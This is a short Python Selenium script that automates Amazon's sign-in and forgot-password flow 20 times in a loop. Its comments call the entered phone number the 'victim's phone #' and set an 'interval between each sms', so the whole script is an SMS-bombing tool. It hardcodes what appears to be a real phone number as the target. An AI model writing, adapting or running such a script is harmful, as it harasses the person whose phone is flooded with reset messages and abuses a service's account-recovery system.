from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
for i in range(20):
    # create an instance of Chrome webDriver
    options = webdriver.ChromeOptions()
    options.add_argument('--remote-debugging-pipe')

    driver=webdriver.Chrome()
    driver.get("https://www.amazon.com/ap/signin?useMobileAsClaim=true&showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&signInRedirectToFPPThreshold=6&showMessageRatesApply=false&pageId=usflex&showSignInWithOTPButton=true&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&prevRID=WBRR20667BSJJ4P1VQX4&openid.assoc_handle=usflex&useSignInWithOTP=true&openid.mode=checkid_setup&prepopulatedLoginId=eyJjaXBoZXIiOiJsL1lYTHh4M1dmZkNveGlEVVlNa1ZBPT0iLCJJViI6IjZSMFpKaVZ4S1lJZnIxelJXMW9wN2c9PSIsInZlcnNpb24iOjF9&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&timestamp=1706760659000&ref_=ap_pwd_change")
    
    # find the element we are using
    # enter x_path
    # target mobile number (enter victim's phone # after send_keys)
    time.sleep(0.1)

    driver.find_element("xpath", '//*[@id="ap_email"]').send_keys('3109229613')

    time.sleep(0.3)
    # find the continue element using x_path
    # click on that element

    driver.find_element("xpath", '//*[@id="continue"]').click()

    time.sleep(0.1)
    # find element to reset password using x_path
    # click on it
    # find the continue element using x_path
    # click on it

    driver.find_element("xpath", '//*[@id="auth-fpp-link-bottom"]').click()
    driver.find_element("xpath", '//*[@id="continue"]').click()

    # set the interval between each sms
    time.sleep(4)

    # Close the browser
    driver.close()

